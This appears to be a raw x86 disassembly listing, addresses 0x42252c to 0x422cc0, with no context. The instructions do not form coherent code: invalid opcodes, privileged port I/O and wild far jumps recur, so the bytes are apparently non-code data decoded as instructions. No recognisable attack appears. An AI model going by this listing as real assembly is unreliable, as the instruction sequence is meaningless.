  42252c:	xchg   ebp,eax
  42252d:	xor    edi,edx
  42252f:	nop
  422530:	test   DWORD PTR [esp+ecx*1],edi
  422533:	dec    ecx
  422534:	xchg   ebx,eax
  422535:	push   es
  422536:	mov    ch,0x85
  422538:	adc    esp,DWORD PTR ds:0x605d77db
  42253e:	ror    BYTE PTR [ecx+0x22],cl
  422541:	jge    0x422507
  422543:	sub    eax,DWORD PTR [ebp-0x60]
  422546:	dec    esp
  422547:	adc    bh,bl
  422549:	pop    ds
  42254a:	sub    al,0xf6
  42254c:	mov    al,ds:0x442437d6
  422551:	mov    BYTE PTR [eax],ah
  422553:	inc    ebp
  422554:	or     al,0x8c
  422556:	inc    ecx
  422557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422558:	shl    BYTE PTR [ebp+0x1c],1
  42255b:	xor    DWORD PTR [ebp+0x1f],ecx
  42255e:	popf   
  42255f:	inc    esi
  422560:	jecxz  0x4225a9
  422562:	mov    bl,BYTE PTR [ebp+0x3e4d7abf]
  422568:	inc    ecx
  422569:	dec    ebx
  42256a:	fwait
  42256b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42256c:	idiv   DWORD PTR [edx+ecx*1+0x7f]
  422570:	and    cl,BYTE PTR [ebx-0x24]
  422573:	xlat   BYTE PTR ds:[ebx]
  422574:	add    DWORD PTR [eax-0x2c],0x1c
  422578:	dec    ebp
  422579:	test   BYTE PTR [esi-0x70],ah
  42257c:	pop    eax
  42257d:	push   ecx
  42257e:	sar    DWORD PTR [edx],cl
  422580:	loope  0x422513
  422582:	mov    ah,0x48
  422584:	loope  0x42253c
  422586:	bound  esi,QWORD PTR [ebx+0x34fbbebe]
  42258c:	pop    esp
  42258d:	jecxz  0x42257a
  42258f:	fldenv [ecx-0x44]
  422592:	sbb    eax,0xe0db24c6
  422597:	daa    
  422598:	mov    cl,0x4e
  42259a:	push   ebp
  42259b:	ret    0xc4c3
  42259e:	inc    eax
  42259f:	inc    esi
  4225a0:	dec    edx
  4225a1:	lock test DWORD PTR [ecx-0x7d],edx
  4225a5:	dec    ecx
  4225a6:	fimul  WORD PTR [esi]
  4225a8:	mov    edx,0x28f0e380
  4225ad:	popf   
  4225ae:	mov    ds:0x1d187517,al
  4225b3:	mov    bh,0x5e
  4225b5:	ficomp WORD PTR [eax]
  4225b7:	dec    ecx
  4225b8:	jg     0x4225e5
  4225ba:	jge    0x42261f
  4225bc:	pushf  
  4225bd:	lahf   
  4225be:	in     eax,dx
  4225bf:	test   al,0xeb
  4225c1:	cs js  0x42254e
  4225c4:	add    bh,ch
  4225c6:	cmp    dl,BYTE PTR [edi]
  4225c8:	push   es
  4225c9:	pusha  
  4225ca:	xor    DWORD PTR [ebx-0x633df852],esi
  4225d0:	icebp  
  4225d1:	out    0x21,al
  4225d3:	adc    DWORD PTR [ebx],ecx
  4225d5:	cli    
  4225d6:	xor    ch,BYTE PTR [esi-0x4801bb50]
  4225dc:	adc    dl,BYTE PTR [esi+0x5d]
  4225df:	xor    edx,ebp
  4225e1:	fwait
  4225e2:	xchg   esi,eax
  4225e3:	mov    bh,BYTE PTR [edi+0x68c62d9b]
  4225e9:	push   es
  4225ea:	fidivr DWORD PTR [edi+0x5]
  4225ed:	fistp  WORD PTR [esi+0x54f6c58d]
  4225f3:	cmp    ah,BYTE PTR [ebp+0x5c]
  4225f6:	inc    ebp
  4225f7:	bound  ecx,QWORD PTR [esi+0x50d843ff]
  4225fd:	xchg   BYTE PTR [eax-0xa],al
  422600:	push   ebx
  422601:	fstp   st(5)
  422603:	(bad)  
  422604:	clc    
  422605:	mov    ch,bl
  422607:	sub    esp,edx
  422609:	pop    esp
  42260a:	pop    esi
  42260b:	lods   eax,DWORD PTR ds:[esi]
  42260c:	frstor [ecx-0x10ced530]
  422612:	ds jne 0x4225cb
  422615:	and    al,0x66
  422617:	sbb    DWORD PTR [ebp+ebx*2-0x20188055],ebp
  42261e:	xchg   DWORD PTR [eax+0x1f],ebx
  422621:	inc    esp
  422622:	xchg   edx,eax
  422623:	pop    ebx
  422624:	call   0xa956b98f
  422629:	xor    DWORD PTR [edi+0x7],edx
  42262c:	xchg   edi,eax
  42262d:	sub    ebp,eax
  42262f:	in     al,0xcd
  422631:	repnz mov edi,0x6ebba1c9
  422637:	mov    ecx,DWORD PTR [ebx+0x31]
  42263a:	imul   esp,DWORD PTR [edi+0x14831e67],0x5d
  422641:	or     BYTE PTR [eax],dl
  422643:	stos   DWORD PTR es:[edi],eax
  422644:	lea    edi,ds:0x6a20e67a
  42264a:	pop    ss
  42264b:	ror    DWORD PTR [ecx+0x70],cl
  42264e:	jnp    0x4225e1
  422650:	jb     0x42266a
  422652:	cdq    
  422653:	mov    WORD PTR [ebx],ss
  422655:	fnstsw WORD PTR [ecx+edi*8]
  422658:	jle    0x42266c
  42265a:	jecxz  0x42265e
  42265c:	bound  ebp,QWORD PTR [edx]
  42265e:	add    al,0xc7
  422660:	or     BYTE PTR [ebp-0x64],dh
  422663:	fsub   st(3),st
  422665:	dec    edx
  422666:	ds loop 0x422659
  422669:	loope  0x422649
  42266b:	inc    ebp
  42266c:	mov    edx,0x13fa6ce3
  422671:	outs   dx,DWORD PTR ds:[esi]
  422672:	cld    
  422673:	xchg   esp,eax
  422674:	pop    edx
  422675:	in     eax,dx
  422676:	jmp    0x3b63c798
  42267b:	pop    ecx
  42267c:	push   ss
  42267d:	push   eax
  42267e:	outs   dx,DWORD PTR ds:[esi]
  42267f:	dec    edi
  422680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422681:	icebp  
  422682:	add    BYTE PTR [ebx+eiz*4-0x7e5e4b36],0xd3
  42268a:	repz fidivr WORD PTR [edi-0x2]
  42268e:	sub    DWORD PTR ds:0x80e13e4b,edi
  422694:	cmc    
  422695:	loope  0x42265c
  422697:	ss mov ah,0x2a
  42269a:	inc    ebx
  42269b:	sahf   
  42269c:	fwait
  42269d:	stos   BYTE PTR es:[edi],al
  42269e:	add    DWORD PTR [esi],ebp
  4226a0:	xor    BYTE PTR [eax],bh
  4226a2:	out    0x31,eax
  4226a4:	popf   
  4226a5:	sti    
  4226a6:	into   
  4226a7:	push   ss
  4226a8:	call   0xe56f3e31
  4226ad:	or     esi,edi
  4226af:	pushf  
  4226b0:	cmp    eax,0x788e9c22
  4226b5:	sbb    eax,0xbf778d33
  4226ba:	add    eax,0x636701e0
  4226bf:	aas    
  4226c0:	xchg   ecx,eax
  4226c1:	in     eax,dx
  4226c2:	sub    DWORD PTR [esi-0x62f3f7ba],ecx
  4226c8:	loope  0x422739
  4226ca:	repz test eax,0xa7f25a1d
  4226d0:	in     eax,dx
  4226d1:	clc    
  4226d2:	popf   
  4226d3:	js     0x4226ed
  4226d5:	mov    al,0xe4
  4226d7:	aad    0x99
  4226d9:	lods   al,BYTE PTR ds:[esi]
  4226da:	ins    BYTE PTR es:[edi],dx
  4226db:	aaa    
  4226dc:	pop    ebp
  4226dd:	dec    esi
  4226de:	mov    dh,0xfd
  4226e0:	fcom   QWORD PTR [edx+0x25]
  4226e3:	arpl   WORD PTR [ebx+0x6b26eb21],si
  4226e9:	test   DWORD PTR [esi],ebx
  4226eb:	jns    0x42270d
  4226ed:	mov    ds:0xea1d0c0a,al
  4226f2:	jecxz  0x422772
  4226f4:	push   edi
  4226f5:	inc    ecx
  4226f6:	cmp    eax,esi
  4226f8:	mov    esp,0xb60c2608
  4226fd:	push   ss
  4226fe:	fisubr WORD PTR [eax]
  422700:	or     edx,DWORD PTR [ecx+0x1c285c9]
  422706:	sbb    DWORD PTR [ebx],esi
  422708:	paddb  mm3,QWORD PTR [ebp+0x55826c79]
  42270f:	and    edx,ebp
  422711:	push   cs
  422712:	aaa    
  422713:	test   eax,0x4440906d
  422718:	test   al,0x3d
  42271a:	call   0xeb18716e
  42271f:	ja     0x422762
  422721:	sub    al,0x11
  422723:	xchg   esi,eax
  422724:	fstp   DWORD PTR [ecx]
  422726:	pop    es
  422727:	dec    esp
  422728:	imul   ebx,ebx,0x44dafb37
  42272e:	add    esi,esi
  422730:	es adc edx,0xcba8b2d9
  422737:	mov    ecx,DWORD PTR [ecx]
  422739:	fisub  WORD PTR [ecx]
  42273b:	shr    DWORD PTR [ecx-0x566e9851],cl
  422741:	mov    ebp,0x7898678b
  422746:	outs   dx,BYTE PTR ds:[esi]
  422747:	bound  esi,QWORD PTR [eax+0x1b]
  42274a:	mov    al,0x34
  42274c:	mov    dl,BYTE PTR [ecx-0x5ac44f60]
  422752:	sub    BYTE PTR [edi+0x57],al
  422755:	dec    edx
  422756:	shr    BYTE PTR [ebx+0x1ce0726a],0xe3
  42275d:	xchg   ebx,eax
  42275e:	aaa    
  42275f:	xchg   ebp,eax
  422760:	or     al,0x3e
  422762:	mov    eax,ds:0xc36b0a4c
  422767:	xlat   BYTE PTR ds:[ebx]
  422768:	add    eax,ebx
  42276a:	call   0xa84c9723
  42276f:	adc    al,BYTE PTR [ecx+ebx*2+0x65e0d43c]
  422776:	lock mov ds:0x4e2a0bd1,al
  42277d:	mov    ebp,0xfe262fe5
  422782:	fistp  QWORD PTR [ebx-0x21]
  422785:	xchg   edx,eax
  422786:	jecxz  0x4227da
  422788:	enter  0x8a7b,0x87
  42278c:	nop
  42278d:	or     edx,DWORD PTR [ebx+0x2]
  422790:	pop    ss
  422791:	mov    ds:0x1eeb33e4,al
  422796:	xchg   ebx,eax
  422797:	cs (bad) 
  422799:	loop   0x42275c
  42279b:	scas   eax,DWORD PTR es:[edi]
  42279c:	clc    
  42279d:	int3   
  42279e:	enter  0xc6fc,0x5a
  4227a2:	nop
  4227a3:	adc    edx,DWORD PTR [ebx+edx*8+0xd]
  4227a7:	mov    edx,0xc3a9a34b
  4227ac:	mov    ecx,0xc9d6a300
  4227b1:	adc    DWORD PTR [edi+0x11],esi
  4227b4:	xchg   edx,eax
  4227b5:	dec    bh
  4227b7:	mov    ebx,0x19e0579f
  4227bc:	stos   BYTE PTR es:[edi],al
  4227bd:	scas   eax,DWORD PTR es:[edi]
  4227be:	mov    al,ds:0xb1f7148
  4227c3:	and    ebp,DWORD PTR [ebp+0x6d4e45f0]
  4227c9:	or     dh,dh
  4227cb:	into   
  4227cc:	vmovlpd xmm5,xmm1,QWORD PTR [ebx+0x30]
  4227d1:	pop    esi
  4227d2:	sub    al,0xe0
  4227d4:	jo     0x4227b0
  4227d6:	sar    DWORD PTR [edx],0x79
  4227d9:	xchg   edi,ebx
  4227db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227dc:	outs   dx,DWORD PTR ds:[esi]
  4227dd:	push   ecx
  4227de:	jns    0x42283d
  4227e0:	(bad)  
  4227e1:	fimul  DWORD PTR [ebp+0x646872c6]
  4227e7:	in     al,0xb0
  4227e9:	int3   
  4227ea:	add    eax,0xfa21b4f9
  4227ef:	aam    0xd7
  4227f1:	push   0x2408eab4
  4227f6:	sbb    al,0x88
  4227f8:	add    BYTE PTR [ebp+eiz*2+0x79],cl
  4227fc:	jo     0x4227a8
  4227fe:	aaa    
  4227ff:	dec    edi
  422800:	pop    edx
  422801:	push   ebp
  422802:	and    ah,BYTE PTR [edx]
  422804:	in     eax,dx
  422805:	jmp    0x18505d77
  42280a:	push   eax
  42280b:	inc    ebp
  42280c:	popa   
  42280d:	push   ds
  42280e:	and    ecx,0xffffff83
  422811:	(bad)  
  422812:	test   BYTE PTR [esi-0x59],0xc7
  422816:	ins    BYTE PTR es:[edi],dx
  422817:	in     al,dx
  422818:	rcl    BYTE PTR [eax+eax*4-0x17],1
  42281c:	ret    
  42281d:	mov    dh,0xb7
  42281f:	sti    
  422820:	xlat   BYTE PTR ds:[ebx]
  422821:	lods   eax,DWORD PTR ds:[esi]
  422822:	xor    al,0x41
  422824:	dec    eax
  422825:	dec    edi
  422826:	fst    st(0)
  422828:	push   ss
  422829:	in     al,0x2
  42282b:	mov    edi,0xfbc5161c
  422830:	pop    esi
  422831:	xchg   esp,eax
  422832:	sbb    BYTE PTR [ebx+0x3e042589],bh
  422838:	push   ebx
  422839:	outs   dx,BYTE PTR ds:[esi]
  42283a:	sbb    ah,ah
  42283c:	mov    eax,ds:0xfda8b94b
  422841:	mov    cl,bh
  422843:	loop   0x4228bc
  422845:	adc    eax,0xf585fe0f
  42284a:	xchg   esp,eax
  42284b:	inc    ebx
  42284c:	lods   al,BYTE PTR ds:[esi]
  42284d:	or     al,0x39
  42284f:	je     0x422876
  422851:	mov    esp,0x85a143da
  422856:	xchg   DWORD PTR ds:0x846818c5,edx
  42285c:	ror    BYTE PTR [esi+0x39],0x78
  422860:	sbb    esi,DWORD PTR [ebx]
  422862:	pop    ebp
  422863:	or     BYTE PTR [ecx-0x39],al
  422866:	out    0xd7,eax
  422868:	(bad)  
  422869:	sub    DWORD PTR [edx+0x70],0x60
  42286d:	leave  
  42286e:	aam    0xa6
  422870:	mov    eax,ds:0xeb5e16ec
  422875:	lahf   
  422876:	mov    ebx,esi
  422878:	add    eax,0xb9e32993
  42287d:	in     eax,dx
  42287e:	mov    WORD PTR [eax],ss
  422880:	fwait
  422881:	add    ah,BYTE PTR ds:0x78acca3f
  422887:	xchg   ecx,eax
  422888:	mov    al,0xbe
  42288a:	jno    0x42288c
  42288c:	jp     0x422891
  42288e:	retf   
  42288f:	cdq    
  422890:	sti    
  422891:	and    al,0x73
  422893:	cmp    esp,DWORD PTR [ebx+0x689ca261]
  422899:	mov    ch,BYTE PTR [eax-0x70]
  42289c:	jbe    0x42282a
  42289e:	addr16 push ecx
  4228a0:	ja     0x422839
  4228a2:	leave  
  4228a3:	dec    ecx
  4228a4:	dec    ecx
  4228a5:	pushf  
  4228a6:	mov    bh,0x31
  4228a8:	js     0x4228f8
  4228aa:	adc    cl,ah
  4228ac:	mov    ah,0x48
  4228ae:	xchg   BYTE PTR [eax+eiz*4-0x4a],dh
  4228b2:	into   
  4228b3:	pop    ecx
  4228b4:	mov    dl,0x45
  4228b6:	cmpxchg DWORD PTR [esi-0x7e],esp
  4228ba:	cmp    al,0x6a
  4228bc:	mov    bl,0xe2
  4228be:	ja     0x4228be
  4228c0:	ins    DWORD PTR es:[edi],dx
  4228c1:	dec    esp
  4228c2:	sti    
  4228c3:	(bad)  
  4228c4:	adc    eax,0xc4b4e401
  4228c9:	pop    ecx
  4228ca:	shr    DWORD PTR [edi],1
  4228cc:	mov    ch,ch
  4228ce:	sbb    DWORD PTR [edx-0x76],0xffffffac
  4228d2:	xchg   ah,ah
  4228d4:	retf   
  4228d5:	push   eax
  4228d6:	mov    WORD PTR [ecx],es
  4228d8:	or     bl,ch
  4228da:	adc    eax,ebp
  4228dc:	loopne 0x4228b0
  4228de:	fs jge 0x422915
  4228e1:	xchg   ecx,eax
  4228e2:	ret    
  4228e3:	and    eax,0x8f3dd8a7
  4228e8:	xor    bl,ch
  4228ea:	and    BYTE PTR [esp+ecx*2],ah
  4228ed:	mov    esi,0xfda66a39
  4228f2:	pop    eax
  4228f3:	clc    
  4228f4:	popf   
  4228f5:	mov    ch,0xb6
  4228f7:	push   cs
  4228f8:	mov    dh,0x43
  4228fa:	enter  0xc38f,0x39
  4228fe:	mov    ebp,0xb044d299
  422903:	push   ebp
  422904:	lods   al,BYTE PTR ds:[esi]
  422905:	inc    ecx
  422906:	cmp    esi,DWORD PTR [ecx-0x7a]
  422909:	dec    esi
  42290a:	mov    eax,0x97388f3e
  42290f:	arpl   WORD PTR [edi+0x644f2732],bx
  422915:	rcr    edi,1
  422917:	pop    ss
  422918:	push   edi
  422919:	and    BYTE PTR [edx],ah
  42291b:	sbb    dh,bh
  42291d:	pop    edi
  42291e:	xor    bl,BYTE PTR [ebx+0x7c8cf277]
  422924:	jnp    0x4228d9
  422926:	repnz popa 
  422928:	push   ebx
  422929:	add    ah,dh
  42292b:	mov    esp,0xa9a6ca12
  422930:	mov    cl,0xb
  422932:	mov    dh,0xe2
  422934:	aad    0xb0
  422936:	jl     0x4229a3
  422938:	out    dx,al
  422939:	sub    BYTE PTR [edx],dh
  42293b:	dec    eax
  42293c:	call   0xa36f3460
  422941:	scas   eax,DWORD PTR es:[edi]
  422942:	in     eax,dx
  422943:	xor    ecx,DWORD PTR ds:0x3e5219e4
  422949:	or     DWORD PTR [esi+eiz*8],esp
  42294c:	sub    al,BYTE PTR [edx]
  42294e:	bound  ebp,QWORD PTR [edx]
  422950:	xor    DWORD PTR [esi-0x67],esi
  422953:	in     eax,dx
  422954:	leave  
  422955:	pop    ebp
  422956:	add    ebx,0xffffff94
  422959:	retf   0xb21f
  42295c:	jl     0x422968
  42295e:	(bad)  
  42295f:	sar    BYTE PTR [edi+0x37ae7e7d],0xa8
  422966:	mov    WORD PTR [esi+esi*8+0x39],?
  42296a:	inc    edi
  42296b:	fcomp  QWORD PTR [eax-0x49278a49]
  422971:	pop    ecx
  422972:	sub    DWORD PTR [ecx],edi
  422974:	inc    edx
  422975:	add    DWORD PTR [eax-0x24],eax
  422978:	push   ebp
  422979:	or     edi,DWORD PTR [eax]
  42297b:	jnp    0x4229a5
  42297d:	cmc    
  42297e:	xchg   esp,eax
  42297f:	sub    edx,DWORD PTR [edi]
  422981:	imul   ecx,DWORD PTR [ebp+0xe],0xffffffc9
  422985:	add    DWORD PTR [ebx],0x9f2bf2ac
  42298b:	mov    al,ds:0x9baaaeb5
  422990:	and    eax,DWORD PTR [edx+esi*8+0x58194791]
  422997:	cld    
  422998:	std    
  422999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42299a:	fcom   QWORD PTR [edi+0x5b]
  42299d:	adc    BYTE PTR [edi+0x6f981d8d],0xe0
  4229a4:	in     eax,0x41
  4229a6:	pushf  
  4229a7:	ret    
  4229a8:	jmp    0x4229a4
  4229aa:	cmp    al,0x12
  4229ac:	add    DWORD PTR [esi-0x6dc8b33e],ebp
  4229b2:	pop    edi
  4229b3:	test   eax,0x524c81a2
  4229b8:	xchg   esi,eax
  4229b9:	push   cs
  4229ba:	push   eax
  4229bb:	dec    ecx
  4229bc:	test   DWORD PTR [ecx-0x49ed3ad9],ebx
  4229c2:	popf   
  4229c3:	(bad)  
  4229c5:	das    
  4229c6:	pop    edi
  4229c7:	mov    ecx,0x36b16695
  4229cc:	cmc    
  4229cd:	dec    ebx
  4229ce:	mov    ah,0x62
  4229d0:	fs js  0x4229b1
  4229d3:	mov    ds:0x73895901,eax
  4229d8:	cmp    al,0xb5
  4229da:	mov    esp,0xc8d79cdf
  4229df:	es int3 
  4229e1:	popa   
  4229e2:	mov    ds:0x3acc57c9,al
  4229e7:	sbb    al,0x45
  4229e9:	jae    0x4229ad
  4229eb:	out    dx,al
  4229ec:	je     0x422a25
  4229ee:	xor    ecx,edx
  4229f0:	dec    eax
  4229f1:	jns    0x4229f5
  4229f3:	sub    esi,DWORD PTR [ebx]
  4229f5:	pop    es
  4229f6:	ds or  bl,0x37
  4229fa:	aas    
  4229fb:	in     al,0x19
  4229fd:	je     0x4229a9
  4229ff:	outs   dx,BYTE PTR ds:[esi]
  422a00:	mov    esi,0x896b73b6
  422a05:	adc    esp,esi
  422a07:	lea    esp,[eax]
  422a09:	es pop ebp
  422a0b:	fsubr  QWORD PTR [ebx+0x73]
  422a0e:	pushf  
  422a0f:	neg    DWORD PTR [ebp-0x61b192a1]
  422a15:	arpl   bp,sp
  422a17:	pushf  
  422a18:	inc    esp
  422a19:	out    0xbd,eax
  422a1b:	or     edi,DWORD PTR [ebx+edx*8]
  422a1e:	push   ss
  422a1f:	xor    al,0xfd
  422a21:	stc    
  422a22:	test   al,0x30
  422a24:	or     eax,0x8125faf9
  422a29:	test   BYTE PTR [esi-0x29],ah
  422a2c:	popa   
  422a2d:	out    0x9d,al
  422a2f:	sbb    al,0x10
  422a31:	add    BYTE PTR [ecx+0x671f2577],ah
  422a37:	(bad)  
  422a38:	mov    edx,0x45cdaaf1
  422a3d:	sub    al,0xe0
  422a3f:	repnz sbb edi,DWORD PTR [edi+0x1476c81e]
  422a46:	jns    0x422a50
  422a48:	ret    0x1276
  422a4b:	add    BYTE PTR cs:[edx-0x56395c50],0x7d
  422a53:	push   eax
  422a54:	data16 mov ch,0x10
  422a57:	aam    0x12
  422a59:	ret    
  422a5a:	nop
  422a5b:	xchg   esi,eax
  422a5c:	push   0xf
  422a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a5f:	pop    edi
  422a60:	imul   ebp,DWORD PTR [ebx+0x71],0x32
  422a64:	mov    ch,0x39
  422a66:	push   edx
  422a67:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a69:	in     al,dx
  422a6a:	jmp    0x9725:0xe84c902a
  422a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a72:	ret    
  422a73:	scas   al,BYTE PTR es:[edi]
  422a74:	dec    esp
  422a75:	push   ebx
  422a76:	mov    ch,0xd3
  422a78:	adc    al,0xc5
  422a7a:	mov    ah,0x4
  422a7c:	mov    ch,0x45
  422a7e:	inc    ecx
  422a7f:	pop    DWORD PTR [ebp+0x44]
  422a82:	sbb    BYTE PTR [edi],bh
  422a84:	add    DWORD PTR [ebx-0x49dff0aa],ecx
  422a8a:	xchg   edi,eax
  422a8b:	test   DWORD PTR [ecx+eax*2],ecx
  422a8e:	xor    ebp,esi
  422a90:	sub    eax,0xddb2e436
  422a95:	fsubr  DWORD PTR [edx]
  422a97:	cmp    eax,0x4542e69c
  422a9c:	test   eax,0x22e3b0c3
  422aa1:	out    dx,eax
  422aa2:	xchg   DWORD PTR [eax-0x8],edx
  422aa5:	or     bl,BYTE PTR [ebx+0x3b]
  422aa8:	cmp    al,BYTE PTR [eax]
  422aaa:	cdq    
  422aab:	daa    
  422aac:	push   esp
  422aad:	sub    bl,BYTE PTR [ecx-0xaf7d408]
  422ab3:	rcr    DWORD PTR [eax+ebp*8+0x7348534f],0xcd
  422abb:	pop    ss
  422abc:	out    dx,al
  422abd:	sub    eax,0xe8dafe2f
  422ac2:	sub    DWORD PTR [bx+si+0x44],0x27
  422ac7:	fsubr  st,st(4)
  422ac9:	fcomp  QWORD PTR [edi+0x60]
  422acc:	cwde   
  422acd:	pop    es
  422ace:	loopne 0x422a59
  422ad0:	adc    eax,DWORD PTR [edi-0x5f]
  422ad3:	lock cmp al,0xe9
  422ad6:	xchg   ebp,eax
  422ad7:	pop    edx
  422ad8:	arpl   WORD PTR [esi],si
  422ada:	daa    
  422adb:	sbb    BYTE PTR [edx],dl
  422add:	rcl    BYTE PTR [ecx+0x2f],0x56
  422ae1:	int    0x41
  422ae3:	call   0x45f02131
  422ae8:	test   BYTE PTR [esi+eiz*4-0x573ef9b8],cl
  422aef:	in     eax,0xa
  422af1:	jnp    0x422b3c
  422af3:	daa    
  422af4:	xchg   ecx,eax
  422af5:	or     ebp,DWORD PTR [ebx+edx*2+0x52]
  422af9:	xchg   ebx,eax
  422afa:	push   ebp
  422afb:	mov    bl,0x60
  422afd:	call   0x2deb:0xe558c75c
  422b04:	inc    edx
  422b05:	scas   eax,DWORD PTR es:[edi]
  422b06:	inc    edi
  422b07:	mov    ch,0x61
  422b09:	mov    eax,0xc4434f2
  422b0e:	stos   BYTE PTR es:[edi],al
  422b0f:	jo     0x422b74
  422b11:	mov    ds:0xf3f704fa,eax
  422b16:	sub    eax,0x98447c2e
  422b1b:	(bad)  
  422b1c:	fstp   TBYTE PTR [ebp-0x27c2784e]
  422b22:	nop
  422b23:	int3   
  422b24:	jg     0x422aa7
  422b26:	mov    eax,0xcdc95d8
  422b2b:	jo     0x422b81
  422b2d:	mov    ebp,0x687cb3ae
  422b32:	or     al,0xce
  422b34:	call   0x5c3a:0x4f1d1ff8
  422b3b:	pop    ds
  422b3c:	aaa    
  422b3d:	xor    ebx,DWORD PTR [esi-0x2c]
  422b40:	push   ebx
  422b41:	sbb    edi,DWORD PTR [eax+ebp*1+0x23]
  422b45:	push   ebp
  422b46:	xchg   esi,eax
  422b47:	sahf   
  422b48:	stos   DWORD PTR es:[edi],eax
  422b49:	and    eax,0x62e9604
  422b4e:	imul   edi
  422b50:	sbb    DWORD PTR [eax+0x3d8722a4],eax
  422b56:	int3   
  422b57:	adc    eax,DWORD PTR [ebx+0x65]
  422b5a:	out    0x24,al
  422b5c:	xchg   BYTE PTR [esi],ch
  422b5e:	(bad)  
  422b5f:	sbb    ecx,ecx
  422b61:	and    BYTE PTR [ecx],ch
  422b63:	shr    DWORD PTR [esi],cl
  422b65:	je     0x422bc9
  422b67:	(bad)  
  422b68:	in     eax,dx
  422b69:	fidiv  WORD PTR [ecx]
  422b6b:	outs   dx,BYTE PTR ds:[esi]
  422b6c:	mov    ecx,0x695c2bf3
  422b71:	call   0xb9ad:0xddb3eaa0
  422b78:	xchg   ebp,eax
  422b79:	xchg   ecx,eax
  422b7a:	sti    
  422b7b:	jo     0x422bbe
  422b7d:	rcl    DWORD PTR [edx+0x78],cl
  422b80:	dec    ecx
  422b81:	cld    
  422b82:	or     eax,0x1109121d
  422b87:	das    
  422b88:	shl    DWORD PTR [ecx-0xf753c4c],1
  422b8e:	mov    al,ds:0xe40b65bf
  422b93:	int    0xf1
  422b95:	jb     0x422b4a
  422b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b98:	dec    ebx
  422b99:	into   
  422b9a:	mov    ds:0x45698e49,eax
  422b9f:	fcom   QWORD PTR [edx]
  422ba1:	mov    bl,0x20
  422ba3:	adc    eax,0xbd9752ec
  422ba8:	pop    eax
  422ba9:	ror    dh,cl
  422bab:	lods   eax,DWORD PTR ds:[esi]
  422bac:	fsub   st(7),st
  422bae:	aas    
  422baf:	enter  0xa720,0xcc
  422bb3:	divps  xmm4,XMMWORD PTR [eax+0x54]
  422bb7:	ins    DWORD PTR es:[edi],dx
  422bb8:	xor    BYTE PTR [ecx],dl
  422bba:	adc    ecx,edx
  422bbc:	sub    eax,0x10f0bb55
  422bc1:	fdiv   st,st(1)
  422bc3:	jae    0x422c3e
  422bc5:	xchg   ecx,eax
  422bc6:	jl     0x422c02
  422bc8:	in     eax,0x7
  422bca:	mov    WORD PTR ds:0xe23b43f3,?
  422bd0:	pop    edi
  422bd1:	outs   dx,BYTE PTR ds:[esi]
  422bd2:	mov    cs,WORD PTR [esi+0x5f43f87f]
  422bd8:	push   esi
  422bd9:	dec    eax
  422bda:	enter  0xe104,0xc
  422bde:	dec    ebp
  422bdf:	or     esp,esp
  422be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422be2:	rcl    DWORD PTR [esi-0x2],cl
  422be5:	lods   al,BYTE PTR ds:[esi]
  422be6:	and    bh,bh
  422be8:	xchg   edx,eax
  422be9:	mov    cl,0x39
  422beb:	aad    0x86
  422bed:	cmp    al,0xa4
  422bef:	adc    dh,ah
  422bf1:	nop
  422bf2:	js     0x422c62
  422bf4:	and    edx,esi
  422bf6:	sbb    eax,0x20d70e0a
  422bfb:	sub    al,0x14
  422bfd:	and    edx,DWORD PTR [edi]
  422bff:	mov    eax,0x27db04b6
  422c04:	mov    ebp,0x7a0a078a
  422c09:	dec    edx
  422c0a:	imul   ebp,DWORD PTR [edx-0x242105b],0x4a
  422c11:	jl     0x422c23
  422c13:	sub    ecx,ecx
  422c15:	sub    eax,0xe859967d
  422c1a:	(bad)  
  422c1b:	(bad)  
  422c1c:	jl     0x422c1f
  422c1e:	iret   
  422c1f:	shl    ch,cl
  422c21:	daa    
  422c22:	repz dec esi
  422c24:	cwde   
  422c25:	pop    esp
  422c26:	jge    0x422c96
  422c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c29:	test   eax,0xc18b4c23
  422c2e:	xor    edi,DWORD PTR [ebp+0x4a]
  422c31:	jle    0x422c60
  422c33:	dec    eax
  422c34:	fisub  WORD PTR ds:0xa62d3726
  422c3a:	push   ebx
  422c3b:	sub    al,0x12
  422c3d:	sbb    esi,esp
  422c3f:	lahf   
  422c40:	mul    BYTE PTR [esi+eax*4+0x55]
  422c44:	or     dl,cl
  422c46:	jecxz  0x422c4e
  422c48:	xchg   BYTE PTR cs:[edx],bl
  422c4b:	clc    
  422c4c:	idiv   BYTE PTR [eax-0x15a3a23c]
  422c52:	stos   BYTE PTR es:[edi],al
  422c53:	outs   dx,DWORD PTR ds:[esi]
  422c54:	sub    bl,BYTE PTR [esi-0x12013826]
  422c5a:	sbb    eax,DWORD PTR [ecx+0x31]
  422c5d:	imul   edx,DWORD PTR [ecx],0xddfa4a74
  422c63:	(bad)  
  422c65:	aad    0xf1
  422c67:	ss call 0x741e:0xb93383ac
  422c6f:	mov    ds:0xa257fe81,al
  422c74:	and    eax,edi
  422c76:	js     0x422cf7
  422c78:	xchg   ebx,eax
  422c79:	cbw    
  422c7b:	js     0x422cc1
  422c7d:	fldcw  WORD PTR [ebx]
  422c7f:	lea    edi,ds:0xfd7f32ef
  422c85:	jb     0x422cc7
  422c87:	inc    eax
  422c88:	es fwait
  422c8a:	adc    al,0xa9
  422c8c:	fdivr  DWORD PTR [ebx]
  422c8e:	or     DWORD PTR [eax+eax*1-0x287a3320],0x1e
  422c96:	rcr    edx,1
  422c98:	push   0x9913c5d6
  422c9d:	jle    0x422c4a
  422c9f:	(bad)  
  422ca0:	fisttp WORD PTR [ecx]
  422ca2:	int3   
  422ca3:	cs (bad) 
  422ca5:	(bad)  
  422ca6:	push   es
  422ca7:	dec    esi
  422ca8:	mov    eax,0x1af0d0a1
  422cad:	in     al,0xd9
  422caf:	push   0xb20fc14f
  422cb4:	sbb    bl,bh
  422cb6:	or     eax,0x99445141
  422cbb:	push   cs
  422cbc:	and    al,0xd5
  422cbe:	lahf   
  422cbf:	pop    es
  422cc0:	push   edi
